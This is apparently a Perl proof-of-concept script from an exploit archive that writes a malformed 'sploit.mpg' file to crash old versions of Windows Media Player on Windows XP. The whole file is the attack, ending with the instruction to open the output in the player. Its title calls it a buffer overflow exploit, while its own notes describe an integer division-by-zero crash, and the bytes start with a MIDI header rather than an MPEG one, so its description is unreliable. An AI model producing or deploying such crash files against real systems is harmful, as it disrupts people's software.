#!/usr/bin/perl


# Windows Media Player 11.0.5721.5145 (.mpg) Buffer Overflow Exploit
# Homepage: www.microsoft.com
# Exploit Coded by: cr4wl3r <cr4wl3r\x40linuxmail\x2Eorg>
# From: Indonesia
#
####################################################
# Testing Results:
####################################################
# Bug: Integer Division By Zero
# Platform: Windows XP SP3 ENG
# Tested versions:
# 1. Windows Media Player 9         = crash
# 2. Windows Media Player 11.0.5721 = crash
# 3. Windows Media Player 11.0.6    = No crash
####################################################
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# WARNING - WARNING - WARNING - WARNING
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#
#
# Disclaimer: The author published the information under the condition
#             that is not in the intention of the reader to use them in order to bring
#             to himself or others a profit or to bring to others damage.
#
#
# Gr33tz: No Thanks



print "
[+]---------------------------------------------------------------------[+]
[+] Windows Media Player 11.0.5721.5145 (.mpg) Buffer Overflow Exploit  [+]
[+] By : cr4wl3r                                                        [+]
[+]---------------------------------------------------------------------[+]
";


$buff = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";

open(file, "> sploit.mpg");
print (file $buff);
print "\n\n[+] Done...!!!\n
[+] Open with Windows Media Player\n
[+] Coded by cr4wl3r\n";